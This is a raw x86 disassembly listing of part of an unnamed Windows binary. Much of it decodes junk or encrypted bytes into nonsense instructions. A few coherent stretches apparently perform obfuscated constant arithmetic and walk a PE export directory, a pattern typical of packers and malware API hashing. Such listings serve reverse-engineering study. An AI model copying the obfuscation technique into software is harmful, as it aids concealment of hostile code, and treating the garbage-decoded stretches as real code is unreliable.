  4058ef:	ss dec ecx
  4058f1:	mov    eax,ds:0x25fe9400
  4058f6:	call   0x82e8:0x1b56c599
  4058fd:	out    0x9a,eax
  4058ff:	push   cs
  405900:	jp     0x40588a
  405902:	mov    ebx,0xe98ce630
  405907:	adc    BYTE PTR [eax-0x16],bl
  40590a:	adc    dh,ah
  40590c:	mov    dl,0x67
  40590e:	out    0x87,al
  405910:	cli    
  405911:	fwait
  405912:	or     al,0xf1
  405914:	stos   BYTE PTR es:[edi],al
  405915:	faddp  st(1),st
  405917:	das    
  405918:	push   ds
  405919:	mov    ds:0x3bf56737,eax
  40591e:	pop    edi
  40591f:	pop    es
  405920:	dec    edx
  405921:	mov    eax,0x46b0ca37
  405926:	icebp  
  405927:	push   ebp
  405928:	sbb    dh,bh
  40592a:	sbb    al,0x17
  40592c:	mov    esi,0x8921005f
  405931:	pop    ds
  405932:	ja     0x4058ca
  405934:	stos   DWORD PTR es:[edi],eax
  405935:	or     BYTE PTR [esi-0x32],dh
  405938:	pop    esp
  405939:	sbb    dl,0xf8
  40593c:	stos   BYTE PTR es:[edi],al
  40593d:	int3   
  40593e:	jnp    0x4058cc
  405940:	add    bl,cl
  405942:	lods   eax,DWORD PTR ds:[esi]
  405943:	jno    0x405931
  405945:	std    
  405946:	pop    ss
  405947:	neg    DWORD PTR ds:0x6047ba5c
  40594d:	dec    eax
  40594e:	inc    edx
  40594f:	inc    esp
  405950:	push   0x4ca09a82
  405955:	mov    bh,0x66
  405957:	(bad)  
  405958:	and    eax,DWORD PTR [edi-0x5e]
  40595b:	xchg   ecx,eax
  40595c:	ret    
  40595d:	(bad)  
  40595e:	jmp    0x405978
  405960:	(bad)  
  405961:	cmp    esp,DWORD PTR [ecx-0x1e]
  405964:	aad    0xd7
  405966:	inc    ebx
  405967:	xor    DWORD PTR [edx+0x46],eax
  40596a:	rcr    BYTE PTR [eax],0xaa
  40596d:	jg     0x40595b
  40596f:	(bad)  
  405970:	push   ds
  405971:	cmp    ch,BYTE PTR [eax-0x1caf71a5]
  405977:	mov    dh,0x54
  405979:	pop    esp
  40597a:	rol    DWORD PTR [edx-0x30],0xf0
  40597e:	in     eax,dx
  40597f:	xchg   ebx,eax
  405980:	xor    DWORD PTR [esi+edx*8],ecx
  405983:	sahf   
  405984:	rcl    esp,1
  405986:	das    
  405987:	js     0x405923
  405989:	popa   
  40598a:	test   DWORD PTR [edi],eax
  40598c:	pop    ss
  40598d:	push   ecx
  40598e:	in     eax,0xd
  405990:	cmp    DWORD PTR [eax],eax
  405992:	sbb    dl,bh
  405994:	je     0x4059b5
  405996:	pop    esp
  405997:	jb     0x40594b
  405999:	imul   ebp,DWORD PTR [edi-0xe],0xffffffa7
  40599d:	inc    edx
  40599e:	xor    eax,0x304aefaa
  4059a3:	inc    eax
  4059a4:	ror    BYTE PTR ds:0x344e92a0,cl
  4059aa:	stos   BYTE PTR es:[edi],al
  4059ab:	push   ds
  4059ac:	sub    edx,DWORD PTR [ebx]
  4059ae:	mov    DWORD PTR [ebx],edx
  4059b0:	clc    
  4059b1:	arpl   WORD PTR [eax-0x53],ax
  4059b4:	mov    bh,0xda
  4059b6:	addr16 (bad) 
  4059b8:	lock jnp 0x4059cd
  4059bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059bc:	or     eax,0xeb481675
  4059c1:	and    eax,0x710a508e
  4059c6:	adc    eax,0xd4d669bf
  4059cb:	sub    ch,BYTE PTR [edi]
  4059cd:	jbe    0x4059c5
  4059cf:	cmp    DWORD PTR [edi+ebx*2],edx
  4059d2:	mov    cl,0x8d
  4059d4:	mov    BYTE PTR [esi-0x34342243],al
  4059da:	cbw    
  4059dc:	jbe    0x40596a
  4059de:	sbb    DWORD PTR [edi],esi
  4059e0:	jmp    0x4059e2
  4059e2:	cwde   
  4059e3:	es jmp 0x4059c4
  4059e6:	adc    bh,BYTE PTR [ecx]
  4059e8:	xor    al,0x79
  4059ea:	sub    BYTE PTR [edi+0x38fcddc3],ch
  4059f0:	arpl   di,bx
  4059f2:	dec    ebp
  4059f3:	(bad)  
  4059f4:	push   ds
  4059f5:	sub    al,0x9a
  4059f7:	dec    ebx
  4059f8:	and    DWORD PTR [ebx],esp
  4059fa:	push   ss
  4059fb:	icebp  
  4059fc:	inc    esp
  4059fd:	sub    al,0xf2
  4059ff:	mov    ?,WORD PTR [eax+0x9]
  405a02:	cmc    
  405a03:	ins    BYTE PTR es:[edi],dx
  405a04:	ja     0x4059b9
  405a06:	mov    ecx,0x8671d2f1
  405a0b:	jp     0x4059d7
  405a0d:	mov    dh,BYTE PTR [eax]
  405a0f:	lods   eax,DWORD PTR ds:[esi]
  405a10:	test   ch,cl
  405a12:	popa   
  405a13:	sub    al,0xff
  405a15:	leave  
  405a16:	sub    ch,BYTE PTR [edx]
  405a18:	loop   0x405a20
  405a1a:	aam    0x9e
  405a1c:	aam    0xcc
  405a1e:	int3   
  405a1f:	xchg   ebp,eax
  405a20:	mov    ah,0xca
  405a22:	xor    edx,DWORD PTR [ecx+0x374f9783]
  405a28:	popa   
  405a29:	push   ecx
  405a2a:	add    BYTE PTR [edi+0x75],ah
  405a2d:	out    0x91,al
  405a2f:	lahf   
  405a30:	xchg   ebx,eax
  405a31:	and    eax,0x71393618
  405a36:	inc    ebx
  405a37:	stc    
  405a38:	fbld   TBYTE PTR [edi+0x10]
  405a3b:	outs   dx,DWORD PTR ds:[esi]
  405a3c:	clc    
  405a3d:	xchg   ebp,eax
  405a3e:	ss sti 
  405a40:	push   ds
  405a41:	mov    al,ds:0x4b1ad609
  405a46:	mov    esp,DWORD PTR [edx+0x73]
  405a49:	mov    ah,0x15
  405a4b:	cwde   
  405a4c:	jbe    0x405a4f
  405a4e:	adc    DWORD PTR [ecx],0x31f845c7
  405a54:	test   DWORD PTR [eax+edi*8+0x797be281],ebx
  405a5b:	add    BYTE PTR [eax],al
  405a5d:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  405a64:	and    edx,edx
  405a66:	mov    eax,DWORD PTR [ebp-0x4]
  405a69:	sbb    ecx,DWORD PTR ds:0x42fe05
  405a6f:	push   esi
  405a70:	mov    esi,DWORD PTR [ebp-0x8]
  405a73:	and    DWORD PTR ds:0x42fdf1,0x0
  405a7d:	jmp    0x405a8f
  405a82:	mov    edx,DWORD PTR ds:0x42fdf1
  405a88:	inc    edx
  405a89:	mov    DWORD PTR ds:0x42fdf1,edx
  405a8f:	cmp    DWORD PTR ds:0x42fdf1,0x17
  405a96:	jae    0x405b0b
  405a9c:	cmp    DWORD PTR ds:0x42fdf1,0x1d
  405aa3:	jne    0x405ab5
  405aa9:	push   DWORD PTR [ebp-0x24]
  405aac:	push   DWORD PTR [ebp-0x20]
  405aaf:	call   DWORD PTR ds:0x42e3db
  405ab5:	jmp    0x405a82
  405aba:	mov    DWORD PTR ds:0x42fdd9,0x14
  405ac4:	cmp    DWORD PTR ds:0x42fdd9,0x0
  405acb:	je     0x405b0b
  405ad1:	cmp    DWORD PTR ds:0x42fdd9,0x16
  405ad8:	jne    0x405af7
  405ade:	push   DWORD PTR [ebp-0x14]
  405ae1:	push   0x2e3f
  405ae6:	push   DWORD PTR [ebp-0x18]
  405ae9:	push   DWORD PTR [ebp-0x18]
  405aec:	push   0x8cdb
  405af1:	call   DWORD PTR ds:0x42e637
  405af7:	xor    edx,edx
  405af9:	xor    edx,DWORD PTR ds:0x42fdd9
  405aff:	dec    edx
  405b00:	mov    DWORD PTR ds:0x42fdd9,edx
  405b06:	jmp    0x405ac4
  405b0b:	mov    edx,0x7510855
  405b10:	add    DWORD PTR ds:0x42fdd1,edi
  405b16:	xor    eax,edx
  405b18:	and    DWORD PTR ds:0x42e7f7,ebx
  405b1e:	xor    esi,edx
  405b20:	mov    ecx,0x32729c
  405b25:	add    esi,ecx
  405b27:	add    eax,ecx
  405b29:	imul   eax,esi
  405b2c:	mov    esi,DWORD PTR [ebp+0xc]
  405b2f:	cmp    esi,eax
  405b31:	jne    0x405b4d
  405b37:	mov    eax,DWORD PTR [ebp-0x4]
  405b3a:	mov    esi,DWORD PTR [ebp-0x8]
  405b3d:	xor    eax,edx
  405b3f:	xor    esi,edx
  405b41:	add    eax,ecx
  405b43:	add    esi,ecx
  405b45:	imul   eax,esi
  405b48:	jmp    0x405e5b
  405b4d:	mov    eax,DWORD PTR [ebp+0xc]
  405b50:	mov    eax,DWORD PTR [eax+0x78]
  405b53:	mov    DWORD PTR [ebp+0xc],eax
  405b56:	mov    eax,DWORD PTR [ebp-0x4]
  405b59:	mov    esi,DWORD PTR [ebp-0x8]
  405b5c:	xor    eax,edx
  405b5e:	xor    esi,edx
  405b60:	add    eax,ecx
  405b62:	add    esi,ecx
  405b64:	imul   eax,esi
  405b67:	mov    esi,DWORD PTR [ebp+0xc]
  405b6a:	cmp    esi,eax
  405b6c:	mov    eax,DWORD PTR [ebp-0x4]
  405b6f:	je     0x405b3a
  405b75:	jmp    0x405e48
  405b7a:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  405b80:	imul   esi,DWORD PTR gs:[eax+0x3],0x1e8b624d
  405b88:	sub    al,0x85
  405b8a:	test   BYTE PTR [edx],dh
  405b8c:	jo     0x405bfe
  405b8e:	stos   BYTE PTR es:[edi],al
  405b8f:	jle    0x405c01
  405b91:	jo     0x405c02
  405b93:	neg    DWORD PTR [edx-0x27]
  405b96:	jne    0x405b80
  405b98:	addr16 cmc 
  405b9a:	fisttp QWORD PTR [eax+ebx*1]
  405b9d:	out    dx,eax
  405b9e:	xlat   BYTE PTR ds:[ebx]
  405b9f:	dec    ecx
  405ba0:	lock add al,0x40
  405ba3:	(bad)  
  405ba5:	adc    ecx,DWORD PTR [edi]
  405ba7:	mov    ch,0xad
  405ba9:	jl     0x405b6b
  405bab:	cmp    DWORD PTR [edx-0x479bda88],edi
  405bb1:	xchg   ebx,eax
  405bb2:	int    0x9e
  405bb4:	inc    eax
  405bb5:	mov    al,BYTE PTR [ebx+0x27ac6e36]
  405bbb:	mov    bh,0x7a
  405bbd:	js     0x405b82
  405bbf:	lgdtd  [esi+0x4b]
  405bc3:	outs   dx,BYTE PTR ds:[esi]
  405bc4:	sbb    eax,ebp
  405bc6:	push   0xffffff9f
  405bc8:	dec    eax
  405bc9:	xchg   esi,eax
  405bca:	push   esi
  405bcb:	xor    edi,esp
  405bcd:	push   es
  405bce:	push   ebp
  405bcf:	rcpps  xmm5,XMMWORD PTR [ecx]
  405bd2:	jne    0x405bc4
  405bd4:	push   edi
  405bd5:	sub    esi,DWORD PTR [eax+ecx*2]
  405bd8:	sbb    al,0x6f
  405bda:	adc    al,0x82
  405bdc:	dec    eax
  405bdd:	ins    BYTE PTR es:[edi],dx
  405bde:	or     BYTE PTR [ebx],ch
  405be0:	into   
  405be1:	call   0x533c4309
  405be6:	and    al,0xe1
  405be8:	call   0xfd0c:0xc675876c
  405bef:	ins    BYTE PTR es:[edi],dx
  405bf0:	test   DWORD PTR [edx],0x7b27da66
  405bf6:	arpl   WORD PTR [edi-0x33a3eecc],si
  405bfc:	jns    0x405b84
  405bfe:	inc    edi
  405bff:	adc    DWORD PTR [eax+0x65],esi
  405c02:	pop    edx
  405c03:	into   
  405c04:	and    al,0xed
  405c06:	movhps QWORD PTR [edx-0xca54a8e],xmm7
  405c0d:	cmp    esp,edx
  405c0f:	adc    ch,bh
  405c11:	jno    0x405bb4
  405c13:	jmp    0x3b57744
  405c18:	mov    BYTE PTR [edi-0x23],ah
  405c1b:	stc    
  405c1c:	push   esi
  405c1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c1f:	add    esp,esp
  405c21:	adc    DWORD PTR [ebp+0x3ac53d8e],0x107a952a
  405c2b:	pop    esp
  405c2c:	jmp    0x405c3e
  405c2e:	enter  0x9d57,0xf3
  405c32:	mov    ecx,0xbab2c9d9
  405c37:	cwde   
  405c38:	push   eax
  405c39:	je     0x405cac
  405c3b:	aad    0xf5
  405c3d:	push   eax
  405c3e:	push   ebx
  405c3f:	pop    ebx
  405c40:	sub    eax,0x22c7a815
  405c45:	outs   dx,DWORD PTR ds:[esi]
  405c46:	das    
  405c47:	ror    DWORD PTR [edx+0x39],0x3b
  405c4b:	fst    QWORD PTR [esi]
  405c4d:	in     al,dx
  405c4e:	mov    eax,0xca856b33
  405c53:	lods   eax,DWORD PTR ds:[esi]
  405c54:	jmp    0x405caf
  405c56:	nop
  405c57:	and    DWORD PTR [esi+edi*8+0x45],edi
  405c5b:	stc    
  405c5c:	loop   0x405c7b
  405c5e:	jb     0x405c60
  405c60:	xchg   esp,eax
  405c61:	sahf   
  405c62:	fs jo  0x405c09
  405c65:	xchg   ecx,eax
  405c66:	mov    ds:0x6fd6680a,eax
  405c6b:	rol    edx,1
  405c6d:	int    0x47
  405c6f:	jns    0x405c6a
  405c71:	pop    ebx
  405c72:	jns    0x405c2b
  405c74:	pop    ecx
  405c75:	lds    ebx,FWORD PTR [eax+ebp*2+0x29]
  405c79:	dec    eax
  405c7a:	call   0x4412b005
  405c7f:	inc    esp
  405c80:	push   eax
  405c81:	ret    
  405c82:	sti    
  405c83:	push   ss
  405c84:	out    0xb7,al
  405c86:	sub    BYTE PTR [edi+0x56],0xcb
  405c8a:	mov    al,0x27
  405c8c:	loopne 0x405c3a
  405c8e:	inc    cl
  405c90:	xchg   ebx,eax
  405c91:	pop    ds
  405c92:	jecxz  0x405c85
  405c94:	push   esi
  405c95:	into   
  405c96:	ret    0xf6b4
  405c99:	pop    esp
  405c9a:	inc    ecx
  405c9b:	dec    esp
  405c9c:	ins    BYTE PTR es:[edi],dx
  405c9d:	int    0x2d
  405c9f:	fiadd  DWORD PTR [esi]
  405ca1:	gs push ebp
  405ca3:	xchg   DWORD PTR [edx-0x40784ebd],esp
  405ca9:	lock inc edi
  405cab:	push   0x63a160b3
  405cb0:	(bad)  
  405cb1:	in     eax,0xb5
  405cb3:	sar    BYTE PTR [ebx],cl
  405cb5:	int3   
  405cb6:	xor    eax,0xf2197ab8
  405cbb:	sub    DWORD PTR [ebx],ebp
  405cbd:	repz imul ebx,DWORD PTR [eax+0x3de45e83],0xb2c45cb7
  405cc8:	mov    al,0xb5
  405cca:	dec    ecx
  405ccb:	(bad)  
  405ccc:	out    0xb7,al
  405cce:	retf   
  405ccf:	clc    
  405cd0:	lods   al,BYTE PTR ds:[esi]
  405cd1:	cmp    BYTE PTR [eax],al
  405cd3:	jecxz  0x405d48
  405cd5:	(bad)  
  405cd6:	pusha  
  405cd7:	mov    dh,0x9a
  405cd9:	rol    DWORD PTR [edx],1
  405cdb:	int3   
  405cdc:	lods   al,BYTE PTR ds:[esi]
  405cdd:	dec    ebx
  405cde:	lods   al,BYTE PTR ds:[esi]
  405cdf:	int    0xee
  405ce1:	or     ebx,DWORD PTR [edx-0x13ee3bc0]
  405ce7:	in     eax,0x49
  405ce9:	add    edx,esp
  405ceb:	popa   
  405cec:	adc    BYTE PTR fs:[edi],bl
  405cef:	adc    DWORD PTR [ecx],ebp
  405cf1:	push   ebx
  405cf2:	in     al,0x9e
  405cf4:	add    ebx,DWORD PTR [esi]
  405cf6:	push   ebp
  405cf7:	mov    ecx,0xda3dfe12
  405cfc:	mov    DWORD PTR [ebp-0xb],eax
  405cff:	mov    ds:0xba40ddd8,al
  405d04:	popa   
  405d05:	nop
  405d06:	in     eax,0xf3
  405d08:	fcom   DWORD PTR [edx-0x62]
  405d0b:	data16 ficomp WORD PTR [edx-0x74]
  405d0f:	jge    0x405d46
  405d11:	(bad)  
  405d12:	mov    esi,0xd1d169a8
  405d17:	pop    edx
  405d18:	mov    cl,0xd2
  405d1a:	mov    al,0x21
  405d1c:	shl    BYTE PTR [esp+eax*1-0x486a34cf],0xf7
  405d24:	lods   eax,DWORD PTR ds:[esi]
  405d25:	imul   esi,DWORD PTR [edx-0x12],0x4d
  405d29:	test   BYTE PTR [esi-0x22],ah
  405d2c:	or     DWORD PTR [edx-0x62],0xffffffad
  405d30:	jp     0x405d51
  405d32:	out    0xae,al
  405d34:	xchg   BYTE PTR [edi-0x2],dl
  405d37:	out    dx,eax
  405d38:	mov    dl,0xd7
  405d3a:	aam    0xeb
  405d3c:	rcl    DWORD PTR [eax+0x1c],1
  405d3f:	add    ebx,ebx
  405d41:	or     ebx,DWORD PTR [esi]
  405d43:	ins    BYTE PTR es:[edi],dx
  405d44:	cdq    
  405d45:	mov    eax,0xe15efa12
  405d4a:	mov    DWORD PTR [ecx+0x3d381543],ecx
  405d50:	dec    edx
  405d51:	pop    eax
  405d52:	scas   eax,DWORD PTR es:[di]
  405d54:	imul   edi,DWORD PTR [edi+0x54],0xffffffad
  405d58:	jno    0x405db8
  405d5a:	push   ss
  405d5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d5c:	xchg   esp,eax
  405d5d:	cld    
  405d5e:	jecxz  0x405dcd
  405d60:	push   ebx
  405d61:	fidivr DWORD PTR [ecx+esi*2-0x9]
  405d65:	sub    eax,0x2c107f07
  405d6a:	sbb    DWORD PTR ds:0x22a213c0,edx
  405d70:	jne    0xb57f86d8
  405d76:	xor    ebp,DWORD PTR [edi+ecx*8+0x51]
  405d7a:	xchg   ecx,eax
  405d7b:	fisub  WORD PTR [edi]
  405d7d:	add    eax,0xb394ed83
  405d82:	dec    ebp
  405d83:	xchg   edx,eax
  405d84:	fnstsw WORD PTR [edx+0x68]
  405d87:	icebp  
  405d88:	sbb    eax,0x4997d311
  405d8d:	retf   0x8a2f
  405d90:	sbb    edx,0x538b3bbd
  405d96:	inc    ebp
  405d97:	bound  edx,QWORD PTR [edi]
  405d99:	mov    esi,DWORD PTR [ecx]
  405d9b:	sub    ebp,DWORD PTR [ebp-0x139a31b2]
  405da1:	mov    dh,0xd6
  405da3:	xor    ecx,DWORD PTR [ebp+esi*1+0x54]
  405da7:	sbb    edi,DWORD PTR [edx+0x1c]
  405daa:	mov    ch,0x2c
  405dac:	neg    BYTE PTR ds:0xa39584b
  405db2:	mov    eax,cs
  405db4:	mov    al,ds:0xe3237843
  405db9:	iret   
  405dba:	sub    BYTE PTR [esi],ch
  405dbc:	push   cs
  405dbd:	push   es
  405dbe:	sbb    esp,DWORD PTR [ecx-0x56d3bd9a]
  405dc4:	pop    ecx
  405dc5:	pop    ds
  405dc6:	xchg   edx,eax
  405dc7:	loope  0x405d9b
  405dc9:	js     0x405d85
  405dcb:	sub    BYTE PTR [ecx+0x7245e128],ch
  405dd1:	xchg   BYTE PTR [edi],dl
  405dd3:	mov    al,ds:0xd14378b1
  405dd8:	(bad)  
  405dd9:	push   0xf53d9565
  405dde:	pop    ss
  405ddf:	in     al,0x95
  405de1:	push   edi
  405de2:	xor    BYTE PTR ds:0x4bc29af5,0x22
  405de9:	enter  0xe9dc,0x62
  405ded:	inc    eax
  405dee:	adc    eax,0xf1bc4814
  405df3:	ret    
  405df4:	stos   DWORD PTR es:[edi],eax
  405df5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405df6:	mov    eax,ds:0xf85cfa9d
  405dfb:	cmc    
  405dfc:	loop   0x405e0d
  405dfe:	mov    al,0x6e
  405e00:	jmp    0x4b57:0x539add27
  405e07:	fisttp QWORD PTR [edi]
  405e09:	idiv   DWORD PTR [edx]
  405e0b:	and    DWORD PTR [ebx-0x5d7cde10],ecx
  405e11:	or     ebp,ebp
  405e13:	loopne 0x405e10
  405e15:	dec    edx
  405e16:	sahf   
  405e17:	jmp    0x67f09915
  405e1c:	sub    DWORD PTR ds:0xd3a32a4c,0x38
  405e23:	pop    ecx
  405e24:	mov    esp,0x61c3b34d
  405e29:	sub    BYTE PTR [esp+edx*4],cl
  405e2c:	mov    edx,0x735bf83
  405e31:	mov    ds:0x2d5a6efb,al
  405e36:	xor    ecx,ecx
  405e38:	pop    esp
  405e39:	cmp    bl,BYTE PTR ds:0xaced3e5c
  405e3f:	pop    ss
  405e40:	aad    0xf8
  405e42:	jae    0x405de1
  405e44:	arpl   WORD PTR [esp+edx*8+0x3c23312],ax
  405e4b:	ror    DWORD PTR [ebx-0x50f0f3b3],0xc1
  405e52:	add    eax,DWORD PTR [ebp+0x8]
  405e55:	mov    DWORD PTR [ebp+0xc],eax
  405e58:	mov    eax,DWORD PTR [ebp+0xc]
  405e5b:	pop    esi
  405e5c:	leave  
  405e5d:	ret    0x8
  405e60:	push   ebp
  405e61:	mov    ebp,esp
  405e63:	push   ecx
  405e64:	add    DWORD PTR ds:0x42e80f,0x1508
  405e6e:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405e75:	mov    eax,DWORD PTR [ebp-0x4]
  405e78:	mov    edx,DWORD PTR [ebp+0x10]
  405e7b:	adc    DWORD PTR ds:0x42e7ef,0x4006
  405e85:	mov    ecx,0x7510855
  405e8a:	xor    DWORD PTR ds:0x42fe01,0x260
  405e94:	xor    eax,ecx
  405e96:	jmp    0x40605c
  405e9b:	fidiv  DWORD PTR [edx+0x7b]
  405e9e:	jle    0x405e33
  405ea0:	jne    0x405e7b
  405ea2:	jb     0x405e2d
  405ea4:	(bad)  
  405ea5:	(bad)  
  405ea6:	sub    al,0x39
  405ea8:	pop    ebp
  405ea9:	push   cs
  405eaa:	push   eax
  405eab:	ds aas 
  405ead:	jo     0x405f1f
  405eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eb0:	jg     0x405f22
  405eb2:	jo     0x405e8d
  405eb4:	jnp    0x405ea9
  405eb6:	sbb    eax,0xe649c73c
  405ebb:	push   ds
  405ebc:	div    ecx
  405ebe:	mov    ch,0xdd
  405ec0:	sub    ch,0xa5
  405ec3:	idiv   DWORD PTR [eax-0x10afa372]
  405ec9:	mov    ds:0x626fd978,eax
  405ece:	push   0x455a316f
  405ed3:	repz xchg edx,eax
  405ed5:	jl     0x405eec
  405ed7:	sar    BYTE PTR [edx],0x36
  405eda:	lea    edx,[esi+0x7a]
  405edd:	add    DWORD PTR [edi-0x4db69b47],ecx
  405ee3:	inc    ebx
  405ee4:	clc    
  405ee5:	pushf  
  405ee6:	cmp    BYTE PTR [edx+0x2f76ca9e],0x38
  405eed:	or     bl,BYTE PTR [ecx-0x37]
  405ef0:	sar    DWORD PTR [edx],cl
  405ef2:	in     al,0xdc
  405ef4:	(bad)  [ecx-0x51]
  405ef7:	out    0xcd,eax
  405ef9:	mov    ecx,0xdd55f6d9
  405efe:	and    ch,BYTE PTR [edx-0x78be30f5]
  405f04:	rcl    bh,1
  405f06:	(bad)  [esi-0x20]
  405f09:	fcomp  DWORD PTR [edi-0x21]
  405f0c:	in     al,0x80
  405f0e:	xchg   esi,eax
  405f0f:	fidivr WORD PTR [esi]
  405f11:	xchg   esi,eax
  405f12:	jmp    0xecf9:0xdc460fab
  405f19:	xor    BYTE PTR [edx-0x1dea2f5e],bl
  405f1f:	test   al,0xd9
  405f21:	mov    DWORD PTR [edx+ebx*2-0x7b],edx
  405f25:	cmp    bl,dl
  405f27:	shl    BYTE PTR [ebx],cl
  405f29:	mov    ecx,0x4a9f3305
  405f2e:	les    esi,FWORD PTR [esi-0x2fdcdd0a]
  405f34:	sbb    DWORD PTR [ecx+eiz*8],eax
  405f37:	xchg   edi,eax
  405f38:	cmp    BYTE PTR [esi+0x68],0xde
  405f3c:	pop    ebx
  405f3d:	ret    
  405f3e:	jl     0x405f32
  405f40:	or     ebp,DWORD PTR [esi]
  405f42:	cmp    eax,0xa1812e7f
  405f47:	adc    al,dh
  405f49:	inc    esp
  405f4a:	jbe    0x405f3b
  405f4c:	sub    eax,0xca331733
  405f51:	sbb    BYTE PTR [esi+0x314e1027],0x4a
  405f58:	or     esp,DWORD PTR [ebp-0x2568425b]
  405f5e:	jbe    0x405f31
  405f60:	pop    es
  405f61:	sbb    DWORD PTR [eax-0x1d527f4f],0x32
  405f68:	fsub   QWORD PTR [edx]
  405f6a:	cmp    DWORD PTR [edx],edx
  405f6c:	rcl    BYTE PTR [esi+edx*1],cl
  405f6f:	mov    DWORD PTR [eiz*1+0x6ecde7e0],ebx
  405f76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f77:	fisubr DWORD PTR [ecx+0x7d]
  405f7a:	push   0xadc281bd
  405f7f:	sub    al,0x36
  405f81:	mov    eax,ds:0xa44b0be8
  405f86:	inc    ecx
  405f87:	cmp    dh,al
  405f89:	xchg   eax,esp
  405f8b:	xchg   ecx,eax
  405f8c:	icebp  
  405f8d:	pop    ds
  405f8e:	xchg   dh,dh
  405f90:	mov    dh,0x48
  405f92:	retf   
  405f93:	fwait
  405f94:	loopne 0x405f92
  405f96:	xor    al,0xee
  405f98:	mov    BYTE PTR [edi+0x3f],cl
  405f9b:	mov    WORD PTR [edx+0x2b],?
  405f9e:	jne    0x405f9e
  405fa0:	gs push es
  405fa2:	push   ss
  405fa3:	(bad)
  405fa6:	in     al,0x7c
  405fa8:	sub    edx,0x8e38a6e4
  405fae:	and    BYTE PTR [ebx-0x1a],bh
  405fb1:	fwait
  405fb2:	out    0x69,al
  405fb4:	dec    esi
  405fb5:	push   0x16
  405fb7:	dec    edi
  405fb8:	push   0xffffffd2
  405fba:	jno    0x405f89
  405fbc:	add    BYTE PTR [ecx+0x1e42c0c8],bh
  405fc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fc3:	repnz out dx,eax
  405fc5:	fs in  eax,0x14
  405fc8:	adc    al,0x61
  405fca:	shl    BYTE PTR [ebx+0x19],1
  405fcd:	jge    0x405fac
  405fcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fd0:	fimul  DWORD PTR [ebx]
  405fd2:	jno    0x405fee
  405fd4:	imul   ecx,DWORD PTR [ebx],0xffffff8f
  405fd7:	inc    esi
  405fd8:	push   ebx
  405fd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fda:	sbb    ch,bl
  405fdc:	(bad)  
  405fdd:	dec    edx
  405fde:	ss jg  0x405ff1
  405fe1:	jnp    0x405f68
  405fe3:	inc    edx
  405fe4:	inc    esi
  405fe5:	or     al,0xdd
  405fe7:	cwde   
  405fe8:	xlat   BYTE PTR ds:[ebx]
  405fe9:	ficom  DWORD PTR [esp+ebp*4+0x8]
  405fed:	nop
  405fee:	inc    esp
  405fef:	fisubr DWORD PTR [ebx-0x3d]
  405ff2:	xchg   esi,eax
  405ff3:	and    bh,cl
  405ff5:	stc    
  405ff6:	jg     0x406024
  405ff8:	(bad)  
  405ff9:	push   0x60
  405ffb:	pop    eax
  405ffc:	int3   
  405ffd:	push   esi
  405ffe:	mov    ds:0xc3c1e280,al
  406003:	xor    DWORD PTR [eax-0x4d1c29c],ebx
  406009:	mov    ebx,DWORD PTR [esi+0x52357391]
  40600f:	cmp    bl,BYTE PTR [edi]
  406011:	ins    BYTE PTR es:[edi],dx
  406012:	imul   DWORD PTR [ebx-0x3b]
  406015:	sub    al,0x18
  406017:	in     eax,0x50
  406019:	adc    ebp,DWORD PTR [eax+0xc]
  40601c:	les    edx,FWORD PTR [esi-0x58]
  40601f:	inc    edx
  406020:	xor    al,0xc9
  406022:	std    
  406023:	add    eax,0x62aaf45c
  406028:	and    al,BYTE PTR [ebx-0x7a]
  40602b:	add    BYTE PTR [eax-0x1b8ea098],dl
  406031:	sbb    al,0x9d
  406033:	cwde   
  406034:	xchg   esi,eax
  406035:	and    al,0xa7
  406037:	xchg   ebp,eax
  406038:	popf   
  406039:	ins    DWORD PTR es:[edi],dx
  40603a:	inc    ebp
  40603b:	int3   
  40603c:	xor    eax,DWORD PTR [eax+0x818676f]
  406042:	xchg   esp,eax
  406043:	inc    edx
  406044:	es cmp eax,0x474a7bca
  40604a:	push   0xcecf5c4c
  40604f:	jnp    0x406086
  406051:	test   DWORD PTR [edx-0x6fbd74a],edx
  406057:	mov    eax,ds:0x2c9842a3
  40605c:	add    eax,0x32729c
  406061:	or     DWORD PTR ds:0x42fe86,0xae4
  40606b:	mov    DWORD PTR [edx],eax
  40606d:	mov    eax,DWORD PTR [ebp+0xc]
  406070:	xor    eax,ecx
  406072:	push   esi
  406073:	sbb    edx,DWORD PTR ds:0x42e218
  406079:	mov    esi,DWORD PTR [ebp+0x10]
  40607c:	or     DWORD PTR ds:0x42fe76,edx
  406082:	mov    edx,0x32729c
  406087:	sbb    DWORD PTR ds:0x42fdf1,0x42e21c
  406091:	add    eax,edx
  406093:	adc    DWORD PTR ds:0x42fdd1,0x42e7fb
  40609d:	mov    DWORD PTR [esi+0x4],eax
  4060a0:	sbb    eax,0x6979
  4060a5:	mov    eax,DWORD PTR [ebp+0x14]
  4060a8:	adc    DWORD PTR ds:0x42fe82,0x2335
  4060b2:	mov    esi,DWORD PTR [ebp+0x10]
  4060b5:	sub    DWORD PTR ds:0x42fdd5,0x1c02
  4060bf:	mov    DWORD PTR [esi+0x8],eax
  4060c2:	or     eax,DWORD PTR ds:0x42fe05
  4060c8:	jmp    0x40628e
  4060cd:	out    dx,al
  4060ce:	hlt    
  4060cf:	arpl   WORD PTR [edx],dx
  4060d1:	popa   
  4060d2:	xchg   ecx,eax
  4060d3:	ins    DWORD PTR es:[edi],dx
  4060d4:	hlt    
  4060d5:	(bad)  
  4060d6:	pop    esp
  4060d7:	xor    eax,0x819b9896
  4060dc:	shl    DWORD PTR [ebp+0x3e],cl
  4060df:	jo     0x406151
  4060e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e2:	jg     0x406154
  4060e4:	jo     0x40613f
  4060e6:	xchg   ebx,eax
  4060e7:	xor    dh,BYTE PTR [esi-0x6]
  4060ea:	mov    ds:0x7dac397a,al
  4060ef:	pop    ss
  4060f0:	(bad)  
